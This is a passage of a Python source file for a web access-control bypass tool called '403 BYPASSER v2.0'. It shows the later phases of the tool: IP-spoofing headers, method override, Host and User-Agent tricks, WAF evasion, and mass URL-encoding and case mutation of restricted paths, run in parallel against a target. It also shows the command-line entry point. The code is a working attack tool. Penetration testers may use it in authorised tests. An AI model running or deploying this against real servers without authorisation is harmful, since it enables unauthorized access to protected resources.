    if phase_header("Verb case variants"):
        results = test_verb_case_variants(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

    # 8. Method override
    if eff_path and phase_header("Method override"):
        results = test_method_override(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

    # 9. Method with body
    if eff_path and phase_header("Method with body"):
        results = test_method_with_body(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

    # 10. IP spoofing headers
    if phase_header("IP spoofing headers"):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = []
            for header_name in IP_SPOOFING_HEADERS:
                for ip_val in IP_SPOOFING_VALUES:
                    h = {header_name: ip_val}
                    futures.append(ex.submit(
                        test_fuzzing, target_url, eff_path, "GET", h,
                        custom_headers, verbose, None, f"{header_name}: {ip_val}"))
            for f in as_completed(futures):
                try:
                    s, code, m, h, p, n = f.result()
                    if s:
                        print_status(target_url, code, m, h, p, extra_note=n)
                except Exception:
                    pass

    # 11. Header bypass (misc)
    if phase_header("Header bypass"):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(test_fuzzing, target_url, eff_path, "GET",
                                 header.copy(), custom_headers, verbose)
                       for header in BYPASS_HEADERS]
            for f in as_completed(futures):
                try:
                    s, code, m, h, p, n = f.result()
                    if s:
                        bypass_h = {k: v for k, v in h.items() if k != 'User-Agent'}
                        note = ', '.join(f'{k}: {v}' for k, v in bypass_h.items())
                        print_status(target_url, code, "GET", h, p, extra_note=note)
                except Exception:
                    pass

    # 12. Header combos
    if eff_path and phase_header("Header combos"):
        results = test_header_combos(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

    # 13. User-Agent bypass
    if phase_header("User-Agent bypass"):
        results = test_user_agent_bypass(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

    # 14. Host header bypass
    if phase_header("Host header bypass"):
        results = test_host_header_bypass(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

    # 15. WAF bypass techniques
    if eff_path and phase_header("WAF bypass"):
        results = test_waf_bypass(target_url, eff_path, custom_headers, verbose)
        for r in results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

    # 16. Path / encoding / case (parallel mega-phase)
    if eff_path and phase_header("Path / encoding / case"):
        eff = eff_path.lstrip('/')
        base_url = target_url.rstrip('/')
        phase_jobs = []

        # Path manipulation techniques
        for technique in PATH_MANIPULATION_TECHNIQUES:
            try:
                modified = technique.format(eff)
                if not modified.startswith('/'):
                    modified = f"/{modified}"
                phase_jobs.append(("path", format_url(target_url, modified), modified,
                                   "Path manipulation"))
            except (IndexError, KeyError):
                continue

        # Char-by-char encoding variants
        for i, ch in enumerate(eff):
            if not ch.isalnum():
                continue
            hex_l = format(ord(ch), '02x')
            hex_u = hex_l.upper()
            for variant in (
                eff[:i] + f"%{hex_l}" + eff[i+1:],
                eff[:i] + f"%{hex_u}" + eff[i+1:],
                eff[:i] + f"%25{hex_l}" + eff[i+1:],
                eff[:i] + f"%25{hex_u}" + eff[i+1:],
                eff[:i] + f"%5cu00{hex_l}" + eff[i+1:],
                eff[:i] + f"%5cu00{hex_u}" + eff[i+1:],
                eff[:i] + f"\\u00{hex_l}" + eff[i+1:],
            ):
                phase_jobs.append(("char", format_url(target_url, variant), variant,
                                   "Char-by-char URL encoding"))

        # Case variations
        case_variants = {
            eff.upper(),
            eff.lower(),
            eff.capitalize(),
            eff.swapcase(),
            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(eff)),
            ''.join(c.lower() if i % 2 else c.upper() for i, c in enumerate(eff)),
        }
        case_variants.discard(eff)
        for variant in case_variants:
            phase_jobs.append(("case", format_url(target_url, variant), variant,
                               "Case variation"))

        # Double/triple encoding of full path
        double_results = test_double_encoding_full_path(target_url, eff_path, custom_headers, verbose)
        for r in double_results:
            print_status(target_url, r[1], r[2], r[3], r[4], extra_note=r[5])

        def _job(label, url_, display_path, note):
            h = {"User-Agent": random_user_agent()}
            if custom_headers:
                h.update(custom_headers)
            if verbose:
                print(f"{colors.BLUE}[*] [{label}] GET {url_}{colors.END}")
            r = safe_request("GET", url_, h, verbose=verbose)
            if is_bypass(eff_path, r):
                return label, r.status_code, h, display_path, note
            return None

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_job, *job) for job in phase_jobs]
            for f in as_completed(futures):
                try:
                    res = f.result()
                    if res:
                        label, code, h, display, note = res
                        print_status(target_url, code, "GET", h, display, extra_note=note)
                except Exception:
                    pass

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def banner():
    print(f"""{colors.RED}{colors.BOLD}
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃         403 BYPASSER v2.0                       ┃
    ┃         Advanced 403/401 Bypass Testing          ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{colors.END}
{colors.DIM}    16 phases | {len(HTTP_METHODS)+len(HTTP_METHOD_CASE_VARIANTS)} HTTP methods | {len(IP_SPOOFING_HEADERS)*len(IP_SPOOFING_VALUES)} IP spoof combos
    {len(PATH_MANIPULATION_TECHNIQUES)} path mutations | {len(BYPASS_HEADERS)} header tricks | {len(BYPASS_USER_AGENTS)} UA variants{colors.END}
""")

def main():
    parser = argparse.ArgumentParser(
        description='Advanced 403/401 Bypass Testing Tool v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com admin
  %(prog)s https://example.com admin,dashboard,api/v1/users
  %(prog)s https://example.com -w paths.txt -t 30
  %(prog)s https://example.com admin -o results.json -v
  %(prog)s https://example.com admin --skip ip-spoof,waf
        """)
    parser.add_argument('url', help='Target URL')
    parser.add_argument('paths', nargs='?', default=None,
                        help='Paths to test (comma-separated)')
    parser.add_argument('-w', '--wordlist', help='Wordlist of paths')
    parser.add_argument('-H', '--header', action='append', dest='headers',
                        help='Custom HTTP header "Header: Value" (repeatable)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Detailed output during test')
    parser.add_argument('-t', '--threads', type=int, default=20,
                        help='Number of threads (default: 20)')
    parser.add_argument('-o', '--output', help='Save findings to JSON file')
    parser.add_argument('--skip', help='Skip phases (comma-separated): '
                        'protocol,http09,http10,root-override,methods,verb-case,'
                        'method-override,method-body,ip-spoof,headers,header-combos,'
                        'ua,host,waf,path-encode')
    args = parser.parse_args()

    banner()

    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
    target_url = args.url.rstrip('/')

    custom_headers = parse_custom_headers(args.headers)
    if custom_headers:
        print(f"{colors.CYAN}[*] Custom headers:{colors.END}")
        for k, v in custom_headers.items():
            print(f"    {k}: {v}")

    skip_map = {
        'protocol': 'Protocol switch',
        'http09': 'HTTP/0.9',
        'http10': 'HTTP/1.0 downgrade',
        'root-override': 'Root header override',
        'methods': 'HTTP methods',
        'verb-case': 'Verb case variants',
        'method-override': 'Method override',
        'method-body': 'Method with body',
        'ip-spoof': 'IP spoofing headers',
        'headers': 'Header bypass',
        'header-combos': 'Header combos',
        'ua': 'User-Agent bypass',
        'host': 'Host header bypass',
        'waf': 'WAF bypass',
        'path-encode': 'Path / encoding / case',
    }
    skip_phases = set()
    if args.skip:
        for s in args.skip.split(','):
            s = s.strip().lower()
            if s in skip_map:
                skip_phases.add(skip_map[s])
            else:
                print(f"{colors.YELLOW}[!] Unknown phase to skip: {s}{colors.END}")

    print(f"{colors.BOLD}[*] Target: {target_url}{colors.END}")

    if args.wordlist:
        paths = load_wordlist(args.wordlist)
        print(f"{colors.BOLD}[*] Loaded {len(paths)} paths from wordlist{colors.END}")
        for p in paths:
            print(f"\n{'═' * 60}")
            print(f"{colors.BOLD}[*] Testing path: {p}{colors.END}")
            print(f"{'═' * 60}")
            run_tests(target_url, p, custom_headers, args.threads, args.verbose, skip_phases)
    elif args.paths:
        path_list = [p.strip() for p in args.paths.split(',')]
        for p in path_list:
            print(f"\n{'═' * 60}")
            print(f"{colors.BOLD}[*] Testing path: {p}{colors.END}")
            print(f"{'═' * 60}")
            run_tests(target_url, p, custom_headers, args.threads, args.verbose, skip_phases)
    else:
        run_tests(target_url, None, custom_headers, args.threads, args.verbose, skip_phases)

    # Summary
    print(f"\n{'═' * 60}")
    if RESULTS:
        print(f"{colors.GREEN}{colors.BOLD}[+] Total bypasses found: {len(RESULTS)}{colors.END}")
        for i, r in enumerate(RESULTS, 1):
            print(f"    {i}. [{r['status']}] {r['method']} {r['url']}")
            if r.get('note'):
                print(f"       {colors.YELLOW}{r['note']}{colors.END}")
    else:
        print(f"{colors.RED}[-] No bypasses found{colors.END}")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(RESULTS, f, indent=2)
        print(f"\n{colors.GREEN}[+] {len(RESULTS)} finding(s) saved to {args.output}{colors.END}")

if __name__ == "__main__":
    main()
